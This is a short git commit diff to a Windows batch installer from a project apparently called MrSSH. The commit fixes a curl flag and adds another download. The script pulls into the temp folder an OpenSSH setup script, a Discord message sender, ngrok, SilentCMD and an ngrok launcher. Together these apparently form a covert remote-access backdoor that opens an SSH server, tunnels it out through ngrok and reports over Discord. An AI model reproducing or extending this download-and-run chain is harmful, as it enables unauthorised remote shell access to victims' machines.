ae678d3aa6c4fb541e0d8250c058361fdaed8b00
dh3b <74708369+dh3b@users.noreply.github.com>
2021-10-26 16:32:47 +0200

    Another update, bc i'm dumb

--- Files/Installer.bat
+++ Files/Installer.bat
@@ -3,7 +3,8 @@ cd %temp%
 curl https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/OpenSSH.ps1 -o OpenSSH.ps1
 curl https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Discord-Message-Sender/Source.bat -o source.bat
 curl https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -o ngrok.zip
-curl https://github.com/dh3b/MrSSH/raw/main/Files/SilentCMD.exe - SilentCMD.exe
+curl https://github.com/dh3b/MrSSH/raw/main/Files/SilentCMD.exe -o SilentCMD.exe
+curl https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/ngrok.cmd -o ngrok.cmd
 
 set ""
 
